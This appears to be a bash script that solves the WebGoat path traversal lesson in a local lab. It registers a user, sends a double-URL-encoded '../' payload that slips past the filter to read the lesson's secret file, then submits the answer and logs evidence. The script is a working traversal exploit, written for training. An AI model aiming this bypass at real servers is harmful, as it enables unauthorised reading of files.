#!/usr/bin/env bash
set -Eeuo pipefail
WG="${WG:-http://<lab-ip>:8080/WebGoat}"
RUN_ID="webgoat_pathtraversal_file_read_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/evidence"
J="$OUT/http/cookies.txt"
WG_USER="pt$(date -u +%H%M%S)"
WG_PASS="webgoat"
MARKER_EXPECTED="You found it submit the SHA-512 hash of your username as answer"
obs(){ python3 - "$OUT/observations.jsonl" "$@" <<'PY'
import json, sys, time
path=sys.argv[1]
obj={'ts':time.time()}
for item in sys.argv[2:]:
    k,v=item.split('=',1); obj[k]=v
with open(path,'a',encoding='utf-8') as f: f.write(json.dumps(obj,sort_keys=True)+'\n')
PY
}
code(){ curl -sS -m 10 -b "$J" -c "$J" -o "$2" -w '%{http_code}' "$1" || echo 000; }
PRE=$(curl -sS -m 8 -o "$OUT/http/pre_login.html" -w '%{http_code}' -c "$J" "$WG/login" || echo 000)
curl -sS -m 8 -b "$J" -c "$J" -X POST "$WG/register.mvc" -d "username=$WG_USER&password=$WG_PASS&matchingPassword=$WG_PASS&agree=agree" -o "$OUT/http/register.html" >/dev/null
LOGIN=$(curl -sS -m 8 -b "$J" -c "$J" -X POST "$WG/login" -d "username=$WG_USER&password=$WG_PASS" -o "$OUT/http/login_post.html" -w '%{http_code}' || echo 000)
LESSON=$(code "$WG/PathTraversal.lesson" "$OUT/http/PathTraversal.lesson.html")
JS=$(code "$WG/lesson_js/path_traversal.js" "$OUT/http/path_traversal.js")
CONTROL=$(code "$WG/PathTraversal/random-picture?id=1" "$OUT/evidence/control_cat_base64.txt")
BLOCK=$(code "$WG/PathTraversal/random-picture?id=../path-traversal-secret" "$OUT/evidence/raw_blocked.txt")
ENC=$(code "$WG/PathTraversal/random-picture?id=%252e%252e%252fpath-traversal-secret" "$OUT/evidence/encoded_secret.jpg")
SECRET_FOUND=no
if grep -aq "$MARKER_EXPECTED" "$OUT/evidence/encoded_secret.jpg"; then SECRET_FOUND=yes; fi
ANSWER=$(python3 - "$WG_USER" <<'PY'
import hashlib, sys
print(hashlib.sha512(sys.argv[1].encode()).hexdigest())
PY
)
SUBMIT=$(curl -sS -m 8 -b "$J" -c "$J" -X POST "$WG/PathTraversal/random" -d "secret=$ANSWER" -o "$OUT/evidence/submit_answer.json" -w '%{http_code}' || echo 000)
POST=$(curl -sS -m 8 -o "$OUT/http/post_login.html" -w '%{http_code}' -b "$J" "$WG/login" || echo 000)
obs category=path_traversal route=<attacker-vm>-v2_to_kali-victim-lab target="$WG" pre_health="$PRE" login_status="$LOGIN" lesson_status="$LESSON" js_status="$JS" control_status="$CONTROL" raw_blocked_status="$BLOCK" encoded_status="$ENC" secret_marker="$SECRET_FOUND" submit_status="$SUBMIT" post_health="$POST" report_readiness=local_learning
cat > "$OUT/summary.md" <<EOF
# WebGoat Path Traversal File Read Safe-Marker Wave

run_id: $RUN_ID
target: $WG
user: $WG_USER
pre_health: $PRE
login_status: $LOGIN
lesson_status: $LESSON
js_status: $JS
control_cat_status: $CONTROL
raw_traversal_blocked_status: $BLOCK
encoded_traversal_status: $ENC
secret_marker_found: $SECRET_FOUND
submit_status: $SUBMIT
post_health: $POST

## Evidence
- control: evidence/control_cat_base64.txt
- blocked raw traversal control: evidence/raw_blocked.txt
- encoded traversal secret response: evidence/encoded_secret.jpg
- lesson source: http/PathTraversal.lesson.html
- client JS: http/path_traversal.js
- observations: observations.jsonl

## Boundary
Authorized local WebGoat lab only; path traversal safe-marker file read only; no sensitive system files, no credential theft, no public target, no persistence.
EOF
if [ "$SECRET_FOUND" = yes ] && [ "$POST" = 200 ]; then
  echo "$OUT"
  exit 0
fi
echo "$OUT"
exit 4
